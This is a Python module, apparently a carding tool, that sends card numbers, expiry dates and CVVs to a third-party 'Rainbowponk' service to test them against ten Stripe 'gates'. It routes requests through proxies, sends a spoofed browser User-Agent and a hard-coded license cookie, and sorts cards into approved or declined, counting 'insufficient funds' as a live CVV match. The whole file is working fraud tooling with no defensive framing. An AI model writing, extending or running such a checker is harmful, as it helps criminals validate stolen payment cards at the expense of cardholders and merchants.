"""
Rainbowponk Stripe API Gateway
Multiple Stripe auth endpoints (V1-V10)
"""

import httpx
import asyncio
from typing import Optional, Dict, Any

# License key for authentication
LICENSE_KEY = "@MissNullMe"
BASE_URL = "https://rainbowponk.com"

# Available Stripe API versions
STRIPE_APIS = {
    "v1": "api/api_stripe_1.php",
    "v2": "api/api_stripe_2.php",
    "v3": "api/api_stripe_3.php",
    "v4": "api/api_stripe_4.php",
    "v5": "api/api_stripe_5.php",
    "v6": "api/api_stripe_6.php",
    "v7": "api/api_stripe_7.php",
    "v8": "api/api_stripe_8.php",
    "v9": "api/api_stripe_9.php",
    "v10": "api/api_stripe_10.php",
}


async def rainbowponk_stripe_check(
    card: str,
    month: str,
    year: str,
    cvv: str,
    proxy: Optional[dict] = None,
    version: str = "v1"
) -> Dict[str, Any]:
    """
    Check card using Rainbowponk Stripe API
    
    Args:
        card: Card number
        month: Expiry month (MM)
        year: Expiry year (YYYY or YY)
        cvv: CVV code
        proxy: Optional proxy configuration
        version: Stripe API version (v1-v10)
    
    Returns:
        Dict with status, message, and card info
    """
    
    # Format card data
    card_data = f"{card}|{month}|{year}|{cvv}"
    
    # Select API endpoint
    api_file = STRIPE_APIS.get(version, STRIPE_APIS["v1"])
    
    # Prepare request
    url = f"{BASE_URL}/api/check"
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"license_key={LICENSE_KEY}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    payload = {
        "lista": card_data,
        "gateway": api_file
    }
    
    try:
        async with httpx.AsyncClient(proxy=proxy, timeout=30.0, follow_redirects=True) as client:
            response = await client.post(url, json=payload, headers=headers)
            
            if response.status_code == 200:
                result = response.json()
                
                # Parse response
                if result.get("status") == "success":
                    return {
                        "status": "approved",
                        "message": result.get("message", "Card Approved"),
                        "card": card_data,
                        "response": result.get("response", ""),
                        "gate": f"Rainbowponk Stripe {version.upper()}"
                    }
                elif "declined" in str(result.get("message", "")).lower():
                    return {
                        "status": "declined",
                        "message": result.get("message", "Card Declined"),
                        "card": card_data,
                        "gate": f"Rainbowponk Stripe {version.upper()}"
                    }
                elif "insufficient" in str(result.get("message", "")).lower():
                    return {
                        "status": "approved",
                        "message": "Insufficient Funds (CVV Match)",
                        "card": card_data,
                        "gate": f"Rainbowponk Stripe {version.upper()}"
                    }
                else:
                    return {
                        "status": "error",
                        "message": result.get("message", "Unknown error"),
                        "card": card_data,
                        "gate": f"Rainbowponk Stripe {version.upper()}"
                    }
            else:
                return {
                    "status": "error",
                    "message": f"HTTP {response.status_code}",
                    "card": card_data,
                    "gate": f"Rainbowponk Stripe {version.upper()}"
                }
                
    except httpx.TimeoutException:
        return {
            "status": "error",
            "message": "Request timeout",
            "card": card_data,
            "gate": f"Rainbowponk Stripe {version.upper()}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:100]}",
            "card": card_data,
            "gate": f"Rainbowponk Stripe {version.upper()}"
        }


# Create individual functions for each version
async def stripe_auth_v1_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_stripe_check(card, month, year, cvv, proxy, "v1")

async def stripe_auth_v2_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_stripe_check(card, month, year, cvv, proxy, "v2")

async def stripe_auth_v3_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_stripe_check(card, month, year, cvv, proxy, "v3")

async def stripe_auth_v4_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_stripe_check(card, month, year, cvv, proxy, "v4")

async def stripe_auth_v5_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_stripe_check(card, month, year, cvv, proxy, "v5")
